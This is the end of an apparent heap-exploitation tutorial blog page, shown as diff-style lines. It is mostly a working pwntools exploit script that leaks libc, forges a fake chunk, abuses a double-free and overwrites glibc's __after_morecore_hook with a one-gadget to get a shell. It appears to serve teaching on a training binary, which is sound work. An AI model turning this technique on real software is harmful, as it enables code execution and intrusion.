+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;&gt; &#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Select the &#34;amend age&#34; option; send new value.</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>amend_age</span><span class=p>(</span><span class=n>age</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;3&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;age: &#34;</span><span class=p>,</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>age</span><span class=si>}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;&gt; &#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Calculate the &#34;wraparound&#34; distance between two addresses.</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>delta</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=mh>0xffffffffffffffff</span> <span class=o>-</span> <span class=n>x</span><span class=p>)</span> <span class=o>+</span> <span class=n>y</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>start</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># This binary leaks the address of puts(), use it to resolve the libc load address.</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;puts() @ &#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>(),</span> <span class=mi>16</span><span class=p>)</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=o>.</span><span class=n>puts</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>timeout</span> <span class=o>=</span> <span class=mf>0.1</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># =============================================================================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># =-=-=- PREPARE A FAKE CHUNK -=-=-=</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Craft a fake chunk using the &#34;age&#34; field.</span>
+</span></span><span class=line><span class=cl><span class=c1># Set its prev_inuse flag to avoid backward consolidation.</span>
+</span></span><span class=line><span class=cl><span class=c1># This fake chunk has a size of 0, so it acts as its own forward consolidation guard.</span>
+</span></span><span class=line><span class=cl><span class=n>age</span> <span class=o>=</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;age: &#34;</span><span class=p>,</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>age</span><span class=si>}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;&gt; &#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># =-=-=- INCREASE MMAP THRESHOLD -=-=-=</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Before we can increase the main arena&#39;s system_mem value, we must increase the mmap_threshold.</span>
+</span></span><span class=line><span class=cl><span class=c1># We do this by requesting then freeing a chunk with size beyond the mmap threshold.</span>
+</span></span><span class=line><span class=cl><span class=n>mem</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x5fff8</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;Y&#34;</span><span class=o>*</span><span class=mi>8</span><span class=p>)</span> <span class=c1># Allocated via mmap().</span>
+</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>mem</span><span class=p>)</span> <span class=c1># Freeing an mmapped chunk increases the mmap threshold to its size.</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># =-=-=- INCREASE SYSTEM_MEM -=-=-=</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Now that the mmap threshold is beyond 0x60000, requesting chunks of that size will allocate them</span>
+</span></span><span class=line><span class=cl><span class=c1># from a heap, rather than via mmap().</span>
+</span></span><span class=line><span class=cl><span class=c1># This in turn will increase the total memory checked out from the kernel, which is tracked by</span>
+</span></span><span class=line><span class=cl><span class=c1># an arena&#39;s system_mem field.</span>
+</span></span><span class=line><span class=cl><span class=n>mem</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x5fff8</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;Z&#34;</span><span class=o>*</span><span class=mi>8</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># =-=-=- LINK FAKE CHUNK INTO A FASTBIN -=-=-=</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># We can&#39;t request fast-sized chunks!</span>
+</span></span><span class=line><span class=cl><span class=c1># Instead, forge one on the heap using vestigial malloc metadata, then free it via a dangling pointer.</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Prepare dangling pointer.</span>
+</span></span><span class=line><span class=cl><span class=n>chunk_A</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x88</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mi>8</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>dangling_pointer</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x88</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;B&#34;</span><span class=o>*</span><span class=mi>8</span><span class=p>)</span> <span class=c1># Dangling pointer.</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>chunk_A</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>dangling_pointer</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Coerce a 0x20 size field onto the heap, lined up with the dangling pointer.</span>
+</span></span><span class=line><span class=cl><span class=n>chunk_C</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0xa8</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;C&#34;</span><span class=o>*</span><span class=mi>8</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>chunk_D</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x88</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;D&#34;</span><span class=o>*</span><span class=mi>8</span><span class=p>)</span> <span class=c1># Guard against top consolidation.</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>chunk_C</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>chunk_E</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x88</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;E&#34;</span><span class=o>*</span><span class=mi>8</span><span class=p>)</span> <span class=c1># Remainder chunk_C, leaving a free 0x20 chunk.</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Free chunk E to consolidate it with the unsorted 0x20 chunk, avoiding unlinking problems later.</span>
+</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>chunk_E</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Consolidate everything with the top chunk, we need to request the space overlapping the 0x20 chunk.</span>
+</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>chunk_D</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Free the dangling pointer, the size field at that location is 0x20, vestigial malloc metadata.</span>
+</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>dangling_pointer</span><span class=p>)</span> <span class=c1># Double-free.</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Request a chunk overlapping the free 0x20 chunk and overwrite its fd with the address</span>
+</span></span><span class=line><span class=cl><span class=c1># of our fake chunk.</span>
+</span></span><span class=line><span class=cl><span class=n>chunk_F</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x88</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;F&#34;</span><span class=o>*</span><span class=mi>8</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>overlap</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x88</span><span class=p>,</span> <span class=n>pack</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=o>.</span><span class=n>user</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># =-=-=- CONSOLIDATE FAKE CHUNK INTO UNSORTEDBIN -=-=-=</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Free the 0x60000 chunk, which is large enough to trigger malloc_consolidate().</span>
+</span></span><span class=line><span class=cl><span class=c1># Previously we did this by requesting then freeing a normal chunk bordering the top.</span>
+</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>mem</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># =-=-=- SORT FAKE CHUNK INTO BIN 126 -=-=-=</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Sort the fake chunk into bin 126 by setting its size to the minimum required to qualify for it,</span>
+</span></span><span class=line><span class=cl><span class=c1># then requesting a chunk larger than the fake chunk.</span>
+</span></span><span class=line><span class=cl><span class=c1># This part is where the unsortedbin size sanity check would catch us if we hadn&#39;t increased system_mem.</span>
+</span></span><span class=line><span class=cl><span class=n>amend_age</span><span class=p>(</span><span class=mh>0x80001</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mh>0x80008</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;G&#34;</span><span class=o>*</span><span class=mi>8</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Increase the fake chunk size so that it can reach the after_morecore hook.</span>
+</span></span><span class=line><span class=cl><span class=c1># Making this value too large will fail the size sanity check during unsortedbin allocation</span>
+</span></span><span class=line><span class=cl><span class=c1># of the following chunk. It can also trigger segfaults or busfaults when the remaindering code</span>
+</span></span><span class=line><span class=cl><span class=c1># attempts to update the prev_size field of the succeeding chunk.</span>
+</span></span><span class=line><span class=cl><span class=n>distance</span> <span class=o>=</span> <span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=o>.</span><span class=n>__after_morecore_hook</span> <span class=o>-</span> <span class=mh>0x20</span><span class=p>)</span> <span class=o>-</span> <span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=o>.</span><span class=n>user</span>
+</span></span><span class=line><span class=cl><span class=n>amend_age</span><span class=p>(</span><span class=n>distance</span> <span class=o>+</span> <span class=mh>0xa1</span><span class=p>)</span> <span class=c1># Leave just enough space in the remainder to request a small chunk overlapping the hook.</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># =-=-=- OVERWRITE HOOK -=-=-=</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># The next request is serviced by our fake chunk.</span>
+</span></span><span class=line><span class=cl><span class=c1># Request a large chunk to bridge the gap between the fake chunk and the hook.</span>
+</span></span><span class=line><span class=cl><span class=c1># We can&#39;t target the free hook this time because we can only write 8 bytes into chunk user data</span>
+</span></span><span class=line><span class=cl><span class=c1># rather than 16, meaning we can&#39;t make up the gap between the start of a chunk overlapping</span>
+</span></span><span class=line><span class=cl><span class=c1># the free hook and the free hook itself.</span>
+</span></span><span class=line><span class=cl><span class=c1># The malloc hook gets clobbered too early by inline metadata, and we don&#39;t have enough control</span>
+</span></span><span class=line><span class=cl><span class=c1># over __morecore arguments, nor does it satisfy any one-gadget constraints.</span>
+</span></span><span class=line><span class=cl><span class=c1># However, we can trigger the after_morecore hook and it satisfies a one-gadget constraint.</span>
+</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=n>distance</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;H&#34;</span><span class=o>*</span><span class=mi>8</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># The next request is serviced by the fake chunk&#39;s remainder and overlaps the after_morecore hook.</span>
+</span></span><span class=line><span class=cl><span class=c1># Use it to overwrite the after_morecore hook with the address of a one-gadget.</span>
+</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mh>0x88</span><span class=p>,</span> <span class=n>pack</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>+</span> <span class=mh>0x3ff5e</span><span class=p>))</span> <span class=c1># rax == NULL</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Request enough space to trigger top chunk extension. Remember that there&#39;s a 0x60000-sized chunk in</span>
+</span></span><span class=line><span class=cl><span class=c1># the unsortedbin at this point so we need to request more than that, but no more than the mmap threshold.</span>
+</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mh>0x60008</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># =============================================================================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div></section><footer class=article-footer><section class=article-tags><a href=/tags/pwnable/>Pwnable</a></section><section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section><section class=article-lastmod><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<span>Last updated on Jun 28, 2024 00:00 UTC</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article class=has-image><a href=/p/the-house-of-spirit/><div class=article-image><img src=/p/the-house-of-spirit/cover.165ad78521342e7305b88a8986f0e768_hua4516f7622f942ea94cadaa72a82b7db_84930_250x150_fill_q75_box_smart1.jpg width=250 height=150 loading=lazy alt="Featured image of post The House of Spirit" data-hash="md5-FlrXhSE0LnMFuIqJhvDnaA=="></div><div class=article-details><h2 class=article-title>The House of Spirit</h2></div></a></article><article class=has-image><a href=/p/welcome-to-linux-heap-exploitation-~-part-1/><div class=article-image><img src=/p/welcome-to-linux-heap-exploitation-~-part-1/cover.977c8f02cef13103bc9478822a0c6c0f_hu1baf41c855c051bc94a2dd717dae5de0_73444_250x150_fill_q75_box_smart1.jpg width=250 height=150 loading=lazy alt="Featured image of post Linux Heap Exploitation - Part 1" data-key="Welcome to Linux Heap Exploitation ~ Part 1" data-hash="md5-l3yPAs7xMQO8lHiCKgxsDw=="></div><div class=article-details><h2 class=article-title>Linux Heap Exploitation - Part 1</h2></div></a></article></div></div></aside><footer class=site-footer><section class=copyright>&copy;
+2024 Blog's Broder</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.26.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
